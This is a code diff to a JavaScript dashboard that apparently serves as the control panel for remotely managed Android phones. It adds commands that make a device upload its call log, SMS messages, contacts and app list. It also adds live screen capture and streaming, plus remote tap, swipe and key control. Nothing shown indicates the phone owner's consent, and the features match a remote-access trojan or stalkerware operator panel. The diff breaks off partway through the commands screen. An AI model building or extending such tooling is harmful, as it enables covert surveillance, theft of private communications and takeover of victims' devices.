@@ -1,6 +1,7 @@
 import {
   ref,
   onValue,
+  set,
   update,
   push,
   remove,
@@ -28,7 +29,12 @@ const state = {
   messages: [],
   contacts: [],
   apps: [],
-  screen: 'home', // lock | home | phone | messages | contacts | apps | settings
+  commands: [],
+  screenData: null,
+  screenControl: null,
+  screenControlMode: 'tap', // tap | swipe
+  lastTapMarker: null,
+  screen: 'home', // lock | home | phone | messages | contacts | apps | commands | screen | settings
   screenHistory: [],
   locked: false,
   shadeOpen: false,
@@ -232,6 +238,86 @@ function normalizeApps(uidNode) {
     .sort((a, b) => (a.name || '').localeCompare(b.name || ''));
 }
 
+function normalizeCommands(uidNode) {
+  const rawNode = uidNode?.commands || uidNode?.command || uidNode?.cmd;
+  return entriesFromRtdb(rawNode)
+    .map((c) => ({
+      id: c.id,
+      command: c.command || c.action || c.name || c.type || 'SYNC',
+      target: c.target || c.list || c.node || 'all',
+      payload: c.payload ?? c.data ?? '',
+      status: String(c.status || 'pending').toLowerCase(),
+      timestampLabel: c.timestampLabel || c.time || 'Recent',
+      createdAt: Number(c.createdAt ?? c.timestamp ?? 0),
+    }))
+    .sort((a, b) => b.createdAt - a.createdAt);
+}
+
+function detectBase64Mime(b64, fallback = 'image/jpeg') {
+  if (!b64) return fallback;
+  if (b64.startsWith('iVBOR')) return 'image/png';
+  if (b64.startsWith('/9j/')) return 'image/jpeg';
+  if (b64.startsWith('UklGR')) return 'image/webp';
+  if (b64.startsWith('R0lGOD')) return 'image/gif';
+  return fallback;
+}
+
+function buildBase64ImageSrc(rawVal, mimeHint = 'image/jpeg') {
+  if (typeof rawVal !== 'string') return '';
+  const trimmed = rawVal.trim();
+  if (!trimmed) return '';
+  if (trimmed.startsWith('data:image/') || trimmed.startsWith('http://') || trimmed.startsWith('https://')) {
+    return trimmed;
+  }
+  const cleanB64 = trimmed.replace(/\s+/g, '');
+  if (cleanB64.length < 16) return '';
+  const mime = detectBase64Mime(cleanB64, mimeHint);
+  return `data:${mime};base64,${cleanB64}`;
+}
+
+function normalizeScreenNode(uidNode) {
+  const raw =
+    uidNode?.screen ??
+    uidNode?.screenshot ??
+    uidNode?.screenShot ??
+    uidNode?.liveScreen ??
+    uidNode?.display ??
+    uidNode?.status?.screenBase64 ??
+    uidNode?.status?.screen;
+  if (!raw) return null;
+  if (typeof raw === 'string') {
+    const src = buildBase64ImageSrc(raw);
+    if (!src) return null;
+    return {
+      imageSrc: src,
+      rawLength: raw.length,
+      width: Number(uidNode?.status?.screenWidth ?? 1080),
+      height: Number(uidNode?.status?.screenHeight ?? 2400),
+      streaming: false,
+      updatedAt: uidNode?.status?.updatedAt || null,
+    };
+  }
+  if (typeof raw === 'object') {
+    const b64 = raw.base64 ?? raw.image ?? raw.frame ?? raw.data ?? raw.url ?? raw.screenshot ?? raw.screenBase64 ?? '';
+    const src = buildBase64ImageSrc(String(b64), raw.mimeType || raw.mime || 'image/jpeg');
+    return {
+      imageSrc: src,
+      rawLength: typeof b64 === 'string' ? b64.length : 0,
+      width: Math.max(100, Number(raw.width ?? raw.screenWidth ?? 1080)),
+      height: Math.max(100, Number(raw.height ?? raw.screenHeight ?? 2400)),
+      streaming: Boolean(raw.streaming ?? false),
+      updatedAt: raw.updatedAt || raw.timestamp || null,
+    };
+  }
+  return null;
+}
+
+function normalizeScreenControlNode(uidNode) {
+  const raw = uidNode?.screenControl || uidNode?.screen_control || uidNode?.control;
+  if (!raw || typeof raw !== 'object') return null;
+  return raw;
+}
+
 function resolveCollectionKey(uidNode, candidates, fallback) {
   if (uidNode && typeof uidNode === 'object') {
     for (const k of candidates) {
@@ -285,6 +371,10 @@ function returnToUidList() {
   state.messages = [];
   state.contacts = [];
   state.apps = [];
+  state.commands = [];
+  state.screenData = null;
+  state.screenControl = null;
+  state.lastTapMarker = null;
   state.shadeOpen = false;
   state.locked = false;
   state.screen = 'home';
@@ -359,6 +449,10 @@ function selectDeviceUid(deviceUid) {
   state.messages = [];
   state.contacts = [];
   state.apps = [];
+  state.commands = [];
+  state.screenData = null;
+  state.screenControl = null;
+  state.lastTapMarker = null;
   state.activeThreadPhone = null;
   state.expandedContactId = null;
   state.locked = false;
@@ -379,12 +473,18 @@ function selectDeviceUid(deviceUid) {
         state.messages = normalizeMessages(node);
         state.contacts = normalizeContacts(node);
         state.apps = normalizeApps(node);
+        state.commands = normalizeCommands(node);
+        state.screenData = normalizeScreenNode(node);
+        state.screenControl = normalizeScreenControlNode(node);
       } else {
         state.status = null;
         state.calllog = [];
         state.messages = [];
         state.contacts = [];
         state.apps = [];
+        state.commands = [];
+        state.screenData = null;
+        state.screenControl = null;
       }
       renderAll();
     },
@@ -411,10 +511,14 @@ async function updateDeviceStatusFields(fields) {
     delete mappedFields.isCharging;
   }
   try {
-    await update(ref(rtdb, path), {
+    const patch = {
       ...mappedFields,
       updatedAt: Date.now(),
-    });
+    };
+    if (rawStatus.lastSeen !== undefined && !('lastSeen' in patch)) {
+      patch.lastSeen = Date.now();
+    }
+    await update(ref(rtdb, path), patch);
   } catch (err) {
     handleRtdbError(err, OperationType.UPDATE, path);
     showErrorBanner(err.message);
@@ -600,6 +704,169 @@ async function uninstallAppEntry(appItem) {
     showPhoneToast('App Uninstalled', appItem.name);
   } catch (err) {
     handleRtdbError(err, OperationType.DELETE, path);
+    showErrorBanner(err.message);
+  }
+}
+
+async function sendDeviceCommand({ command, target = 'all', payload = '' }) {
+  if (!state.activeUid) return;
+  const safeCommand = cleanText(command, 64).toUpperCase().replace(/\s+/g, '_');
+  if (!safeCommand) return;
+  const safeTarget = cleanText(target || 'all', 32).toLowerCase();
+  const safePayload = cleanText(payload, 500);
+  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
+  const path = devicePath(state.activeUid, cmdKey);
+  try {
+    await push(ref(getRtdb(), path), {
+      command: safeCommand,
+      target: safeTarget,
+      payload: safePayload,
+      status: 'pending',
+      timestampLabel: formatNowLabel(),
+      createdAt: Date.now(),
+    });
+    showPhoneToast('Command Sent', `${safeCommand} → /${path}`);
+  } catch (err) {
+    handleRtdbError(err, OperationType.CREATE, path);
+    showErrorBanner(err.message);
+  }
+}
+
+async function updateCommandStatus(commandId, nextStatus) {
+  if (!state.activeUid || !commandId) return;
+  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
+  const path = devicePath(state.activeUid, `${cmdKey}/${commandId}`);
+  const safeStatus = ['pending', 'executed', 'failed'].includes(nextStatus) ? nextStatus : 'executed';
+  try {
+    await update(ref(getRtdb(), path), {
+      status: safeStatus,
+      updatedAt: Date.now(),
+    });
+  } catch (err) {
+    handleRtdbError(err, OperationType.UPDATE, path);
+    showErrorBanner(err.message);
+  }
+}
+
+async function deleteCommandEntry(commandId) {
+  if (!state.activeUid || !commandId) return;
+  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
+  const path = devicePath(state.activeUid, `${cmdKey}/${commandId}`);
+  try {
+    await remove(ref(getRtdb(), path));
+  } catch (err) {
+    handleRtdbError(err, OperationType.DELETE, path);
+    showErrorBanner(err.message);
+  }
+}
+
+async function clearAllCommands() {
+  if (!state.activeUid) return;
+  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
+  const path = devicePath(state.activeUid, cmdKey);
+  try {
+    await remove(ref(getRtdb(), path));
+    showPhoneToast('Command Queue Cleared', `/${path}`);
+  } catch (err) {
+    handleRtdbError(err, OperationType.DELETE, path);
+    showErrorBanner(err.message);
+  }
+}
+
+async function sendScreenTapControl({
+  action = 'tap',
+  x = 0,
+  y = 0,
+  xPercent = 0,
+  yPercent = 0,
+  startX = 0,
+  startY = 0,
+  endX = 0,
+  endY = 0,
+  width = 1080,
+  height = 2400,
+  key = '',
+}) {
+  if (!state.activeUid) return;
+  const rtdb = getRtdb();
+  const controlKey = resolveCollectionKey(state.rawUidNode, ['screenControl', 'screen_control', 'control'], 'screenControl');
+  const controlPath = devicePath(state.activeUid, controlKey);
+  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
+  const cmdPath = devicePath(state.activeUid, cmdKey);
+  const now = Date.now();
+
+  const controlPayload =
+    action === 'swipe'
+      ? {
+          action: 'swipe',
+          startX: Math.round(startX),
+          startY: Math.round(startY),
+          endX: Math.round(endX),
+          endY: Math.round(endY),
+          durationMs: 320,
+          width: Math.round(width),
+          height: Math.round(height),
+          status: 'pending',
+          timestamp: now,
+        }
+      : action === 'key'
+        ? {
+            action: 'key',
+            key: cleanText(key, 32).toUpperCase(),
+            status: 'pending',
+            timestamp: now,
+          }
+        : {
+            action: 'tap',
+            x: Math.round(x),
+            y: Math.round(y),
+            xPercent: Number(Number(xPercent).toFixed(4)),
+            yPercent: Number(Number(yPercent).toFixed(4)),
+            width: Math.round(width),
+            height: Math.round(height),
+            status: 'pending',
+            timestamp: now,
+          };
+
+  const commandName =
+    action === 'swipe'
+      ? 'SCREEN_SWIPE'
+      : action === 'key'
+        ? `KEY_${cleanText(key, 32).toUpperCase()}`
+        : 'SCREEN_TAP';
+
+  try {
+    await set(ref(rtdb, controlPath), controlPayload);
+    await push(ref(rtdb, cmdPath), {
+      command: commandName,
+      target: 'screen',
+      ...controlPayload,
+      payload: JSON.stringify(controlPayload),
+      timestampLabel: formatNowLabel(),
+      createdAt: now,
+    });
+    if (action === 'tap') {
+      state.lastTapMarker = {
+        x: controlPayload.x,
+        y: controlPayload.y,
+        xPercent: controlPayload.xPercent,
+        yPercent: controlPayload.yPercent,
+        at: now,
+      };
+      showPhoneToast(
+        'Tap Sent to Server',
+        `(${controlPayload.x}, ${controlPayload.y}) · ${Math.round(controlPayload.xPercent * 100)}%, ${Math.round(controlPayload.yPercent * 100)}%`
+      );
+    } else if (action === 'swipe') {
+      showPhoneToast(
+        'Swipe Sent to Server',
+        `(${controlPayload.startX},${controlPayload.startY}) → (${controlPayload.endX},${controlPayload.endY})`
+      );
+    } else {
+      showPhoneToast('Screen Key Sent', commandName);
+    }
+  } catch (err) {
+    handleRtdbError(err, OperationType.WRITE, controlPath);
     showErrorBanner(err.message);
   }
 }
@@ -794,6 +1061,8 @@ function getAppGlyph(name) {
   if (n.includes('phone')) return { bg: 'bg-emerald-600/80 border border-emerald-400/40', label: 'PH' };
   if (n.includes('messag')) return { bg: 'bg-cyan-700/80 border border-cyan-400/40', label: 'MS' };
   if (n.includes('contact')) return { bg: 'bg-teal-700/80 border border-teal-400/40', label: 'CT' };
+  if (n.includes('screen') || n.includes('mirror')) return { bg: 'bg-cyan-700/80 border border-cyan-400/50', label: 'SC' };
+  if (n.includes('command') || n.includes('cmd')) return { bg: 'bg-emerald-700/80 border border-emerald-400/50', label: 'CM' };
   if (n.includes('system') || n.includes('setting')) return { bg: 'bg-slate-800 border border-emerald-500/30', label: 'SY' };
   return { bg: 'bg-slate-800 border border-emerald-500/25', label: (name || 'AP').slice(0, 2).toUpperCase() };
 }
@@ -803,6 +1072,8 @@ function launchAppByName(appName) {
   if (n.includes('phone') || n.includes('dialer')) return navigateTo('phone');
   if (n.includes('messag') || n.includes('sms')) return navigateTo('messages');
   if (n.includes('contact')) return navigateTo('contacts');
+  if (n.includes('screen') || n.includes('mirror')) return navigateTo('screen');
+  if (n.includes('command') || n.includes('cmd')) return navigateTo('commands');
   if (n.includes('system') || n.includes('battery') || n.includes('setting')) return navigateTo('settings');
   showPhoneToast(appName, 'Running in sandboxed emulator view');
 }
@@ -890,6 +1161,45 @@ function renderHomeScreen() {
           </div>
         </button>
 
+        <button
+          type="button"
+          data-nav="screen"
+          class="w-full p-3 rounded-2xl bg-[#07130e]/90 border border-cyan-500/35 text-left hover:border-cyan-400/70 transition-colors cursor-pointer flex items-center justify-between gap-3"
+        >
+          <div class="min-w-0">
+            <p class="text-[10px] font-mono-tabular text-cyan-400">&gt; LIVE_SCREEN_BASE64</p>
+            <p class="text-xs font-semibold text-white truncate mt-0.5">Remote Screen &amp; Tap Control</p>
+            <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">
+              ${state.screenData?.imageSrc ? `${state.screenData.width}×${state.screenData.height} · Base64 active` : `Waiting at ${devicePath(state.activeUid, 'screen')}`}
+            </p>
+          </div>
+          <span class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 rounded-lg shrink-0">
+            Open Screen →
+          </span>
+        </button>
+
+        <div class="grid grid-cols-2 gap-2.5">
+          <button
+            type="button"
+            data-nav="commands"
+            class="p-3 rounded-2xl bg-[#07130e]/85 border border-emerald-500/30 text-left hover:border-emerald-400/60 transition-colors cursor-pointer"
+          >
+            <p class="text-[10px] font-mono-tabular text-emerald-400">LIST_UPLOAD_CMD</p>
+            <p class="text-xs font-semibold text-white truncate mt-1">Command Center</p>
+            <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">${state.commands.filter((c) => c.status === 'pending').length} pending · ${state.commands.length} total</p>
+          </button>
+
+          <button
+            type="button"
+            data-nav="settings"
+            class="p-3 rounded-2xl bg-[#07130e]/85 border border-emerald-500/30 text-left hover:border-emerald-400/60 transition-colors cursor-pointer"
+          >
+            <p class="text-[10px] font-mono-tabular text-emerald-400">STATUS_UPDATER</p>
+            <p class="text-xs font-semibold text-white truncate mt-1">${status.online ? 'Online' : 'Offline'} · ${esc(status.networkType)}</p>
+            <p class="text-[11px] font-mono-tabular text-slate-400 truncate mt-0.5">Edit &amp; sync device status</p>
+          </button>
+        </div>
+
         <div class="grid grid-cols-2 gap-2.5">
           <button
             type="button"
@@ -940,7 +1250,7 @@ function renderHomeScreen() {
         </div>
       </div>
 
-      <div class="p-2 rounded-2xl bg-[#07130e]/90 border border-emerald-500/25 grid grid-cols-4 gap-1.5">
+      <div class="p-2 rounded-2xl bg-[#07130e]/90 border border-emerald-500/25 grid grid-cols-5 gap-1">
         <button type="button" data-nav="phone" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
           <span class="w-9 h-9 rounded-xl bg-emerald-600/80 border border-emerald-400/40 text-white text-[11px] font-mono-tabular font-bold flex items-center justify-center">PH</span>
           <span class="text-[10px] text-slate-200 mt-1">Phone</span>
@@ -949,13 +1259,17 @@ function renderHomeScreen() {
           <span class="w-9 h-9 rounded-xl bg-cyan-700/80 border border-cyan-400/40 text-white text-[11px] font-mono-tabular font-bold flex items-center justify-center">MS</span>
           <span class="text-[10px] text-slate-200 mt-1">SMS${unreadCount > 0 ? ` (${unreadCount})` : ''}</span>
         </button>
+        <button type="button" data-nav="screen" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
+          <span class="w-9 h-9 rounded-xl bg-cyan-950 border border-cyan-400/50 text-cyan-300 text-[11px] font-mono-tabular font-bold flex items-center justify-center">SC</span>
+          <span class="text-[10px] text-slate-200 mt-1">Screen</span>
+        </button>
         <button type="button" data-nav="contacts" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
           <span class="w-9 h-9 rounded-xl bg-teal-700/80 border border-teal-400/40 text-white text-[11px] font-mono-tabular font-bold flex items-center justify-center">CT</span>
           <span class="text-[10px] text-slate-200 mt-1">Contacts</span>
         </button>
-        <button type="button" data-nav="apps" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
-          <span class="w-9 h-9 rounded-xl bg-slate-800 border border-emerald-500/30 text-emerald-300 text-[11px] font-mono-tabular font-bold flex items-center justify-center">AP</span>
-          <span class="text-[10px] text-slate-200 mt-1">Apps</span>
+        <button type="button" data-nav="commands" class="flex flex-col items-center justify-center py-2 rounded-xl hover:bg-emerald-500/10 cursor-pointer">
+          <span class="w-9 h-9 rounded-xl bg-emerald-950 border border-emerald-400/50 text-emerald-300 text-[11px] font-mono-tabular font-bold flex items-center justify-center">CM</span>
+          <span class="text-[10px] text-slate-200 mt-1">Cmd</span>
         </button>
       </div>
     </div>
@@ -978,9 +1292,19 @@ function renderPhoneScreenApp() {
   return `
     <div class="min-h-full bg-[#040a07] flex flex-col">
       <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 pt-3 pb-2.5 border-b border-slate-800">
-        <div>
-          <h2 class="text-sm font-bold text-white">Phone &amp; Call Log</h2>
-          <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'calllog'))} · ${state.calllog.length} records</p>
+        <div class="flex items-center justify-between gap-2">
+          <div>
+            <h2 class="text-sm font-bold text-white">Phone &amp; Call Log</h2>
+            <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'calllog'))} · ${state.calllog.length} records</p>
+          </div>
+          <button
+            type="button"
+            data-send-upload-cmd="UPLOAD_CALLLOG"
+            data-upload-target="calllog"
+            class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer shrink-0"
+          >
+            ↑ Upload Cmd
+          </button>
         </div>
         <div class="grid grid-cols-3 gap-1 p-1 mt-2.5 bg-slate-900 rounded-lg">
           <button type="button" data-phone-tab="all" class="py-1.5 text-xs font-medium rounded-md cursor-pointer ${tab === 'all' ? 'bg-emerald-600 text-white' : 'text-slate-400 hover:text-white'}">All</button>
@@ -1165,14 +1489,24 @@ function renderMessagesScreen() {
 
   return `
     <div class="min-h-full bg-[#040a07] flex flex-col">
-      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800 flex items-center justify-between">
+      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-2">
         <div>
           <h2 class="text-sm font-bold text-white">Messages</h2>
           <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'messages'))} · ${threads.length} threads</p>
         </div>
-        <button type="button" data-action="open-new-msg" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">
-          + New
-        </button>
+        <div class="flex items-center gap-1.5 shrink-0">
+          <button
+            type="button"
+            data-send-upload-cmd="UPLOAD_MESSAGES"
+            data-upload-target="messages"
+            class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer"
+          >
+            ↑ Upload Cmd
+          </button>
+          <button type="button" data-action="open-new-msg" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">
+            + New
+          </button>
+        </div>
       </div>
 
       <div class="divide-y divide-slate-800/80">
@@ -1246,12 +1580,22 @@ function renderContactsScreen() {
   return `
     <div class="min-h-full bg-[#040a07] flex flex-col">
       <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 pt-3 pb-2.5 border-b border-slate-800 space-y-2.5">
-        <div class="flex items-center justify-between">
+        <div class="flex items-center justify-between gap-2">
           <div>
             <h2 class="text-sm font-bold text-white">Contacts</h2>
             <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'contacts'))} · ${state.contacts.length} saved</p>
           </div>
-          <button type="button" data-action="open-add-contact" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">+ Add</button>
+          <div class="flex items-center gap-1.5 shrink-0">
+            <button
+              type="button"
+              data-send-upload-cmd="UPLOAD_CONTACTS"
+              data-upload-target="contacts"
+              class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer"
+            >
+              ↑ Upload Cmd
+            </button>
+            <button type="button" data-action="open-add-contact" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">+ Add</button>
+          </div>
         </div>
         <input
           id="input-contact-search"
@@ -1362,12 +1706,22 @@ function renderAppsScreen() {
   return `
     <div class="min-h-full bg-[#040a07] flex flex-col">
       <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 pt-3 pb-2.5 border-b border-slate-800 space-y-2.5">
-        <div class="flex items-center justify-between">
+        <div class="flex items-center justify-between gap-2">
           <div>
             <h2 class="text-sm font-bold text-white">App List</h2>
             <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'apps'))} · ${state.apps.length} installed</p>
           </div>
-          <button type="button" data-action="open-install-app" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">+ Install</button>
+          <div class="flex items-center gap-1.5 shrink-0">
+            <button
+              type="button"
+              data-send-upload-cmd="UPLOAD_APPS"
+              data-upload-target="apps"
+              class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer"
+            >
+              ↑ Upload Cmd
+            </button>
+            <button type="button" data-action="open-install-app" class="px-3 py-1.5 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">+ Install</button>
+          </div>
         </div>
 
         <input
@@ -1444,6 +1798,296 @@ function renderAppsScreen() {
   `;
 }
 
+function renderLiveScreenView() {
+  const sc = state.screenData;
+  const ctrl = state.screenControl;
+  const tapMarker = state.lastTapMarker;
+  const mode = state.screenControlMode;
+  const updatedText = sc?.updatedAt ? new Date(Number(sc.updatedAt)).toLocaleTimeString() : 'Waiting';
+
+  return `
+    <div class="min-h-full bg-[#040a07] flex flex-col">
+      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-2.5 border-b border-slate-800 flex items-center justify-between gap-2">
+        <div class="min-w-0">
+          <h2 class="text-sm font-bold text-white truncate">Live Screen &amp; Tap Control</h2>
+          <p class="text-[11px] font-mono-tabular text-slate-400 truncate">${esc(devicePath(state.activeUid, 'screen'))} · ${esc(updatedText)}</p>
+        </div>
+        <div class="flex items-center gap-1.5 shrink-0">
+          <button
+            type="button"
+            data-send-upload-cmd="CAPTURE_SCREEN"
+            data-upload-target="screen"
+            class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 hover:bg-cyan-500/25 rounded-lg cursor-pointer"
+          >
+            ↻ Capture
+          </button>
+          <button
+            type="button"
+            data-send-upload-cmd="${sc?.streaming ? 'STOP_SCREEN_STREAM' : 'START_SCREEN_STREAM'}"
+            data-upload-target="screen"
+            class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold ${sc?.streaming ? 'bg-red-500/20 border-red-400/40 text-red-300' : 'bg-emerald-500/15 border-emerald-500/35 text-emerald-300'} border rounded-lg cursor-pointer"
+          >
+            ${sc?.streaming ? '■ Stop' : '▶ Stream'}
+          </button>
+        </div>
+      </div>
+
+      <div class="p-3 sm:p-4 flex-1 flex flex-col items-center gap-3">
+        <div class="w-full max-w-md flex items-center justify-between gap-2 px-3 py-2 rounded-xl bg-[#07130e] border border-emerald-500/20 text-[11px] font-mono-tabular">
+          <div class="flex items-center gap-1">
+            <button
+              type="button"
+              data-screen-mode="tap"
+              class="px-2.5 py-1 rounded-md cursor-pointer ${mode === 'tap' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
+            >
+              Tap Mode
+            </button>
+            <button
+              type="button"
+              data-screen-mode="swipe"
+              class="px-2.5 py-1 rounded-md cursor-pointer ${mode === 'swipe' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'}"
+            >
+              Swipe Mode
+            </button>
+          </div>
+          <span class="text-emerald-300 truncate">
+            ${tapMarker ? `TAP (${tapMarker.x}, ${tapMarker.y})` : ctrl?.action ? `${String(ctrl.action).toUpperCase()} (${ctrl.x ?? ctrl.startX ?? 0}, ${ctrl.y ?? ctrl.startY ?? 0})` : 'Click screen to send tap'}
+          </span>
+        </div>
+
+        <div class="w-full max-w-md flex flex-col items-center">
+          <div
+            id="remote-screen-stage"
+            class="relative w-full max-w-[360px] bg-[#020504] border-2 border-emerald-500/35 rounded-2xl overflow-hidden shadow-2xl select-none touch-none cursor-crosshair"
+            title="Tap or drag on the screen to send control coordinates to Firebase RTDB"
+          >
+            ${sc?.imageSrc ? `
+              <img
+                id="remote-screen-image"
+                src="${esc(sc.imageSrc)}"
+                alt="Live Android Device Screen"
+                draggable="false"
+                class="w-full h-auto block pointer-events-none select-none"
+              />
+              ${tapMarker ? `
+                <span
+                  class="absolute w-7 h-7 -ml-3.5 -mt-3.5 rounded-full border-2 border-emerald-400 bg-emerald-400/25 pointer-events-none animate-ping"
+                  style="left:${(tapMarker.xPercent * 100).toFixed(2)}%;top:${(tapMarker.yPercent * 100).toFixed(2)}%"
+                ></span>
+                <span
+                  class="absolute w-3.5 h-3.5 -ml-[7px] -mt-[7px] rounded-full border-2 border-white bg-emerald-400 pointer-events-none shadow"
+                  style="left:${(tapMarker.xPercent * 100).toFixed(2)}%;top:${(tapMarker.yPercent * 100).toFixed(2)}%"
+                ></span>
+              ` : ''}
+            ` : `
+              <div
+                id="remote-screen-fallback"
+                class="w-full aspect-[9/19] flex flex-col items-center justify-center p-6 text-center space-y-3"
+              >
+                <div class="w-12 h-12 rounded-2xl bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 font-mono-tabular font-bold flex items-center justify-center text-sm">
+                  B64
+                </div>
+                <div class="space-y-1">
+                  <p class="text-xs font-mono-tabular font-semibold text-emerald-300">AWAITING_BASE64_SCREEN</p>
+                  <p class="text-[11px] text-slate-400">
+                    Push a Base64 frame to <span class="font-mono-tabular text-emerald-400">${esc(devicePath(state.activeUid, 'screen'))}</span> or tap anywhere here to test sending coordinates to <span class="font-mono-tabular text-cyan-300">${esc(devicePath(state.activeUid, 'screenControl'))}</span>.
+                  </p>
+                </div>
+                ${tapMarker ? `
+                  <p class="text-[11px] font-mono-tabular text-emerald-300 bg-emerald-500/10 border border-emerald-500/30 px-2.5 py-1 rounded-lg">
+                    Last Tap Sent: (${tapMarker.x}, ${tapMarker.y}) · ${Math.round(tapMarker.xPercent * 100)}%, ${Math.round(tapMarker.yPercent * 100)}%
+                  </p>
+                ` : ''}
+              </div>
+            `}
+          </div>
+        </div>
+
+        <div class="w-full max-w-md grid grid-cols-4 gap-2">
+          <button
+            type="button"
+            data-screen-key="BACK"
+            class="py-2 text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
+          >
+            ◁ Back
+          </button>
+          <button
+            type="button"
+            data-screen-key="HOME"
+            class="py-2 text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
+          >
+            ○ Home
+          </button>
+          <button
+            type="button"
+            data-screen-key="RECENTS"
+            class="py-2 text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
+          >
+            □ Recents
+          </button>
+          <button
+            type="button"
+            data-screen-key="POWER"
+            class="py-2 text-[11px] font-mono-tabular font-medium bg-[#07130e] border border-emerald-500/25 hover:border-emerald-400/60 text-slate-200 rounded-xl cursor-pointer"
+          >
+            ⏻ Wake
+          </button>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function renderCommandsScreen() {
+  const quickPresets = [
+    { cmd: 'UPLOAD_CALLLOG', target: 'calllog', label: 'Upload Call Log', desc: `${state.calllog.length} cached` },
+    { cmd: 'UPLOAD_MESSAGES', target: 'messages', label: 'Upload Messages', desc: `${state.messages.length} cached` },
+    { cmd: 'UPLOAD_CONTACTS', target: 'contacts', label: 'Upload Contacts', desc: `${state.contacts.length} cached` },
+    { cmd: 'UPLOAD_APPS', target: 'apps', label: 'Upload App List', desc: `${state.apps.length} cached` },
+    { cmd: 'UPLOAD_STATUS', target: 'status', label: 'Refresh Status', desc: 'Battery & Online' },
+    { cmd: 'UPLOAD_ALL', target: 'all', label: 'Upload All Lists', desc: 'Full RTDB sync' },
+  ];
+
+  return `
+    <div class="min-h-full bg-[#040a07] flex flex-col">
+      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-2">
+        <div>
+          <h2 class="text-sm font-bold text-white">List Upload Command Center</h2>
+          <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'commands'))} · ${state.commands.length} commands</p>
+        </div>
+        ${state.commands.length > 0 ? `
+          <button type="button" data-action="clear-all-commands" class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-medium bg-red-950/60 border border-red-500/30 text-red-300 hover:bg-red-900/60 rounded-lg cursor-pointer shrink-0">
+            Clear All
+          </button>
+        ` : ''}
+      </div>
+
+      <div class="p-4 space-y-4">
+        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
+          <div class="flex items-center justify-between">
+            <p class="text-xs font-mono-tabular font-semibold text-emerald-300">&gt; QUICK_LIST_UPLOAD_COMMANDS</p>
+            <span class="text-[10px] font-mono-tabular text-slate-400">One-tap RTDB dispatch</span>
+          </div>
+          <div class="grid grid-cols-2 sm:grid-cols-3 gap-2">
+            ${quickPresets
+              .map(
+                (p) => `
+                <button
